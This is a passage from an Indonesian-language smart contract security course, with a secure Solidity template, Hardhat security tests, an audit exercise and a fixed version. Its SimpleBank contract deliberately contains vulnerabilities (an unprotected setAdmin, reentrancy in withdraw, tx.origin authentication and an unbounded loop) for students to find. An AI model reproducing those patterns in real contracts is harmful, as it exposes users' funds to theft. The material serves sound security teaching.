│    ├── Limit array sizes                                        │
│    └── Use batch processing untuk operasi besar                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 9.2 Code Review Template

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title SecureTemplate
 * @dev Template untuk smart contract yang secure
 * @notice Gunakan ini sebagai starting point
 */
contract SecureTemplate {
    // ============ State Variables ============
    address public owner;
    bool public paused;

    // ============ Custom Errors ============
    // Gas-efficient dibanding require strings
    error NotOwner();
    error ZeroAddress();
    error ZeroAmount();
    error ContractPaused();
    error TransferFailed();

    // ============ Events ============
    event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);
    event Paused(address account);
    event Unpaused(address account);

    // ============ Modifiers ============
    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOwner();
        _;
    }

    modifier whenNotPaused() {
        if (paused) revert ContractPaused();
        _;
    }

    modifier validAddress(address _addr) {
        if (_addr == address(0)) revert ZeroAddress();
        _;
    }

    modifier validAmount(uint256 _amount) {
        if (_amount == 0) revert ZeroAmount();
        _;
    }

    // ============ Constructor ============
    constructor() {
        owner = msg.sender;
    }

    // ============ External Functions ============

    // ============ Public Functions ============

    // ============ Internal Functions ============

    // ============ Private Functions ============

    // ============ View/Pure Functions ============
}
```

### 9.3 Testing Security Vulnerabilities

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Security Tests", function () {

    describe("Access Control", function () {
        it("Should revert if non-owner calls admin function", async function () {
            const [owner, attacker] = await ethers.getSigners();

            const Contract = await ethers.getContractFactory("SecureContract");
            const contract = await Contract.deploy();

            await expect(
                contract.connect(attacker).adminFunction()
            ).to.be.revertedWithCustomError(contract, "NotOwner");
        });
    });

    describe("Input Validation", function () {
        it("Should revert on zero address", async function () {
            const Contract = await ethers.getContractFactory("SecureContract");
            const contract = await Contract.deploy();

            await expect(
                contract.setAddress(ethers.ZeroAddress)
            ).to.be.revertedWithCustomError(contract, "ZeroAddress");
        });

        it("Should revert on zero amount", async function () {
            const Contract = await ethers.getContractFactory("SecureContract");
            const contract = await Contract.deploy();

            await expect(
                contract.deposit({ value: 0 })
            ).to.be.revertedWithCustomError(contract, "ZeroAmount");
        });
    });

    describe("Reentrancy Protection", function () {
        it("Should prevent reentrancy attack", async function () {
            // Deploy contracts
            const SecureBank = await ethers.getContractFactory("SecureBank");
            const secureBank = await SecureBank.deploy();

            const Attacker = await ethers.getContractFactory("ReentrancyAttacker");
            const attacker = await Attacker.deploy(await secureBank.getAddress());

            // Fund the bank
            const [, user] = await ethers.getSigners();
            await secureBank.connect(user).deposit({
                value: ethers.parseEther("10")
            });

            // Attack should fail
            await expect(
                attacker.attack({ value: ethers.parseEther("1") })
            ).to.be.reverted;
        });
    });
});
```

---

## 10. Hands-on: Audit Smart Contract

### 10.1 Contract untuk Di-audit

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title SimpleBank
 * @dev Contract ini memiliki beberapa vulnerability. Temukan semuanya!
 */
contract SimpleBank {
    mapping(address => uint256) public balances;
    address public admin;
    bool public withdrawEnabled = true;

    constructor() {
        admin = msg.sender;
    }

    // Vulnerability #1: ???
    function setAdmin(address newAdmin) public {
        admin = newAdmin;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // Vulnerability #2: ???
    function withdraw(uint256 amount) public {
        require(withdrawEnabled, "Withdrawals disabled");
        require(balances[msg.sender] >= amount, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] -= amount;
    }

    // Vulnerability #3: ???
    function emergencyWithdraw() public {
        require(tx.origin == admin, "Not admin");
        payable(admin).transfer(address(this).balance);
    }

    function toggleWithdraw() public {
        require(msg.sender == admin, "Not admin");
        withdrawEnabled = !withdrawEnabled;
    }

    // Vulnerability #4: ???
    function batchTransfer(address[] memory recipients, uint256 amount) public {
        require(balances[msg.sender] >= amount * recipients.length, "Insufficient");

        for (uint256 i = 0; i < recipients.length; i++) {
            balances[msg.sender] -= amount;
            balances[recipients[i]] += amount;
        }
    }
}
```

### 10.2 Audit Report Template

```markdown
# Smart Contract Audit Report

## Contract: SimpleBank
## Auditor: [Nama]
## Date: [Tanggal]

---

## Executive Summary

[Ringkasan temuan]

## Findings

### [CRITICAL] Vulnerability #1: Missing Access Control on setAdmin

**Location:** Line X

**Description:**
Fungsi setAdmin() tidak memiliki modifier onlyAdmin, sehingga siapa saja
bisa mengubah admin.

**Impact:**
Attacker bisa mengambil alih kontrol contract dan mencuri semua dana.

**Recommendation:**
```solidity
function setAdmin(address newAdmin) public onlyAdmin {
    require(newAdmin != address(0), "Zero address");
    admin = newAdmin;
}
```

---

### [HIGH] Vulnerability #2: Reentrancy in withdraw

**Location:** Line X

**Description:**
Fungsi withdraw() melakukan external call sebelum mengupdate state.

**Impact:**
Attacker bisa melakukan reentrancy attack dan menguras semua dana.

**Recommendation:**
Gunakan Checks-Effects-Interactions pattern atau ReentrancyGuard.

---

### [MEDIUM] Vulnerability #3: tx.origin Authentication

**Location:** Line X

**Description:**
Fungsi emergencyWithdraw() menggunakan tx.origin untuk authentication.

**Impact:**
Admin bisa di-phishing untuk memanggil contract jahat yang kemudian
memanggil emergencyWithdraw().

**Recommendation:**
Gunakan msg.sender untuk authentication.

---

### [LOW] Vulnerability #4: Unbounded Loop

**Location:** Line X

**Description:**
Fungsi batchTransfer() tidak membatasi panjang array recipients.

**Impact:**
Bisa menyebabkan out-of-gas jika array terlalu besar.

**Recommendation:**
Tambahkan limit maksimum untuk array length.

---

## Recommendations Summary

| # | Severity | Issue | Status |
|---|----------|-------|--------|
| 1 | Critical | Missing Access Control | Open |
| 2 | High | Reentrancy | Open |
| 3 | Medium | tx.origin Usage | Open |
| 4 | Low | Unbounded Loop | Open |
```

### 10.3 Fixed Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title SecureBank
 * @dev Fixed version of SimpleBank
 */
contract SecureBank is ReentrancyGuard, Ownable {
    mapping(address => uint256) public balances;
    bool public withdrawEnabled = true;

    uint256 public constant MAX_BATCH_SIZE = 100;

    error WithdrawalsDisabled();
    error InsufficientBalance();
    error BatchTooLarge();
    error ZeroAddress();

    event Deposited(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event BatchTransferred(address indexed from, uint256 totalAmount);

    constructor() Ownable(msg.sender) {}

    function deposit() public payable {
        require(msg.value > 0, "Must deposit something");
        balances[msg.sender] += msg.value;
        emit Deposited(msg.sender, msg.value);
    }

    // FIXED: ReentrancyGuard + CEI pattern
    function withdraw(uint256 amount) public nonReentrant {
        if (!withdrawEnabled) revert WithdrawalsDisabled();
        if (balances[msg.sender] < amount) revert InsufficientBalance();

        // Effects before Interactions
        balances[msg.sender] -= amount;

        // Interactions last
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        emit Withdrawn(msg.sender, amount);
    }

    // FIXED: Menggunakan msg.sender (inherited onlyOwner)
    function emergencyWithdraw() public onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }

    function toggleWithdraw() public onlyOwner {
        withdrawEnabled = !withdrawEnabled;
    }

    // FIXED: Batch size limit
    function batchTransfer(
        address[] calldata recipients,
        uint256 amount
    ) public {
        if (recipients.length > MAX_BATCH_SIZE) revert BatchTooLarge();

        uint256 totalAmount = amount * recipients.length;
        if (balances[msg.sender] < totalAmount) revert InsufficientBalance();

        balances[msg.sender] -= totalAmount;

        for (uint256 i = 0; i < recipients.length;) {
            if (recipients[i] == address(0)) revert ZeroAddress();
            balances[recipients[i]] += amount;
            unchecked { ++i; } // Safe karena bounded loop
        }

        emit BatchTransferred(msg.sender, totalAmount);
    }
}
```

---

## Ringkasan

### Vulnerability Summary

| Vulnerability | Severity | Prevention |
|--------------|----------|------------|
| **Reentrancy** | Critical | CEI Pattern, ReentrancyGuard |
| **Access Control** | Critical | Modifiers, Ownable, AccessControl |
| **Integer Overflow** | High | Solidity >= 0.8 |
| **tx.origin** | Medium | Gunakan msg.sender |
| **DoS** | Medium | Pull over Push, Batch limits |
| **Front-running** | Medium | Commit-Reveal, Slippage protection |

### Tools untuk Security

| Tool | Fungsi |
|------|--------|
| **Slither** | Static analysis |
| **Mythril** | Security analysis |
| **Echidna** | Fuzzing |
| **OpenZeppelin** | Secure contract library |

### Learning Path

```
Basic Security          →    Advanced Security       →    Professional
─────────────────────────────────────────────────────────────────────
• Understand attacks      • Formal verification       • Audit reports
• Use OpenZeppelin        • Fuzzing with Echidna      • Bug bounties
• Write secure code       • Static analysis           • Security research
• Test vulnerabilities    • Gas optimization          • Incident response
```

---

## Tugas

### Tugas 1: Identifikasi Vulnerability

1. Baca contract `SimpleBank` di atas
2. Identifikasi semua vulnerability
3. Jelaskan impact dari masing-masing vulnerability
4. Buat audit report singkat

### Tugas 2: Fix Vulnerabilities

1. Fork contract `SimpleBank`
2. Perbaiki semua vulnerability yang ditemukan
3. Tambahkan test untuk membuktikan vulnerability sudah diperbaiki
4. Deploy ke local network dan test

### Tugas 3: Secure Contract dari Awal

Buat smart contract **SecureEscrow** dengan fitur:

1. Buyer bisa deposit dana
2. Seller bisa release dana setelah buyer konfirmasi
3. Arbiter bisa refund atau release jika ada dispute
4. Implementasikan dengan security best practices:
   - Access control (Buyer, Seller, Arbiter)
   - ReentrancyGuard
   - Pausable
   - Proper events
   - Input validation

### Kriteria Penilaian

| Aspek | Bobot |
|-------|-------|
| Identifikasi vulnerability | 25% |
| Penjelasan impact | 25% |
| Implementasi fix | 30% |
| Test cases | 20% |

---

## Referensi

- [SWC Registry - Smart Contract Weakness Classification](https://swcregistry.io/)
- [OpenZeppelin Security](https://docs.openzeppelin.com/contracts/4.x/)
- [Consensys Smart Contract Best Practices](https://consensys.github.io/smart-contract-best-practices/)
- [Slither - Static Analyzer](https://github.com/crytic/slither)
- [Damn Vulnerable DeFi - Practice](https://www.damnvulnerabledefi.xyz/)
